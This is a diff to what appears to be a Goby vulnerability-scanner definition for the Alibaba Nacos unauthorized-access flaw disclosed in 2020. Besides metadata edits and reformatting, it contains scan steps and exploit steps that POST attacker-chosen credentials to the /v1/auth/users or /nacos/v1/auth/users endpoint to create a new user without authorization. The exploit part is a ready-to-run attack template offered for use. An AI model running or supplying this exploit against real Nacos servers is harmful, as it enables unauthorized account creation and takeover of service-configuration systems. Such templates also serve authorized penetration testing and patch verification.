@@ -2,38 +2,39 @@
       "Name": "Alibaba Nacos Add user not authorized",
       "Level": "2",
       "Tags": [
-            "unauthorized"
+            "Ultra vires"
       ],
-      "GobyQuery": "title=\"Nacos\"",
-      "Description": "Alibaba Nacos is an easy-to-use platform designed for dynamic service discovery and configuration and service management. It helps you to build cloud native applications and microservices platform easily.",
+      "GobyQuery": "title==\"Nacos\"",
+      "Description": "On December 29, 2020, the Nacos official disclosed in the issue released by GitHub that there is an unauthorized access vulnerability in Alibaba Nacos due to improper handling of user agent. Through this vulnerability, the attacker can perform arbitrary operations, including creating a new user and performing post login operations.",
       "Product": "Alibaba Nacos",
       "Homepage": "https://github.com/alibaba/nacos",
-      "Author": "",
-      "Impact": "On December 29, 2020, the Nacos official disclosed in the issue released by GitHub that there is an unauthorized access vulnerability in Alibaba Nacos due to improper handling of user agent. Through this vulnerability, the attacker can perform arbitrary operations, including creating a new user and performing post login operations.",
-      "Recommendation": "update",
-      "References": [],
-      "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "User",
-                  "Type": "input",
-                  "Value": "test"
-            },
-            {
-                  "Name": "Pass",
-                  "Type": "input",
-                  "Value": "test"
-            },
-            {
-                  "Name": "Dir",
-                  "Type": "select",
-                  "Value": "/v1/auth/users,/nacos/v1/auth/users"
-            }
+      "Author": "PeiQi",
+      "Impact": "<p>Through this vulnerability, the attacker can perform arbitrary operations, including creating a new user and performing post login operations.<br></p>",
+      "Recommandation": "<p>Upgrade version<br></p>",
+      "References": [
+            "http://wiki.peiqi.tech"
       ],
-      "ExpTips": {
-            "Type": "",
-            "Content": ""
-      },
+      "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "User",
+			"type": "input",
+			"value": "PeiQi",
+			"show": ""
+		},
+		{
+			"name": "Pass",
+			"type": "input",
+			"value": "PeiQi",
+			"show": ""
+		},
+		{
+			"name": "Dir",
+			"type": "select",
+			"value": "/v1/auth/users,/nacos/v1/auth/users",
+			"show": ""
+		}
+	  ],
       "ScanSteps": [
             "OR",
             {
@@ -89,7 +90,7 @@
                   "SetVariable": []
             }
       ],
-      "ExploitSteps": [
+	  "ExploitSteps": [
             "AND",
             {
                   "Request": {
@@ -102,7 +103,7 @@
                         "data_type": "text",
                         "data": "username={{{User}}}&password={{{Pass}}}"
                   },
-                  "ResponseTest": {
+				  "ResponseTest": {
                         "type": "group",
                         "operation": "AND",
                         "checks": [
@@ -116,10 +117,10 @@
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody|undefined|undefined"
-                  ]
+					"output|lastbody"
+				  ]
             }
       ],
-      "PostTime": "0000-00-00 00:00:00",
-      "GobyVersion": "0.0.0"
+      "PostTime": "2021-04-04 19:56:49",
+      "GobyVersion": "1.8.255"
 }
